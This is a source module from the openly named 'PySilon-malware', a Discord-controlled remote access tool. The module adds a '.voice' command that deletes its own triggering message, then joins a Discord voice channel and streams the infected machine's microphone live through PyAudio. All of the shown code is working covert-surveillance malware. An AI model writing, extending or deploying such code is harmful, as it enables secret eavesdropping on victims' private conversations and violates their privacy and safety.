#<imports>
import resources.modules.misc as pysilon_misc
import pyaudio
import discord
import sys
import os
#</imports>

#<command>

@client.command(name="voice")
async def live_mic(ctx, option=None):
    await ctx.message.delete()
    if option != None:
        if option == "join":
            vc = await client.get_channel(channel_ids['voice']).connect(self_deaf=True)
            vc.play(PyAudioPCM())
            await ctx.send('`[' + pysilon_misc.current_time() + '] Joined voice-channel and streaming microphone in realtime.`')
        elif option == "leave":
            if ctx.voice_client is not None:
                await ctx.voice_client.disconnect()
                await ctx.send('`[' + pysilon_misc.current_time() + '] Left voice-channel.`')
            else:
                await ctx.send('`[' + pysilon_misc.current_time() + '] Bot is not in a voice channel.`')
    else:
        embed = discord.Embed(title="📛 Error",description='```Syntax: .voice <join/leave>```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await ctx.send(embed=embed)
#</command>

#<preload>

bundle_dir = os.path.dirname(os.path.abspath(__file__))
opuslib_path = bundle_dir + 'resources/modules/libopus-0.x64.dll'
discord.opus.load_opus(opuslib_path)
class PyAudioPCM(discord.AudioSource):
    def __init__(self, channels=2, rate=48000, chunk=960, input_device=1) -> None:
        p = pyaudio.PyAudio()
        self.chunks = chunk
        self.input_stream = p.open(format=pyaudio.paInt16, channels=channels, rate=rate, input=True, input_device_index=input_device, frames_per_buffer=chunk)
    def read(self) -> bytes:
        return self.input_stream.read(self.chunks)
#</preload>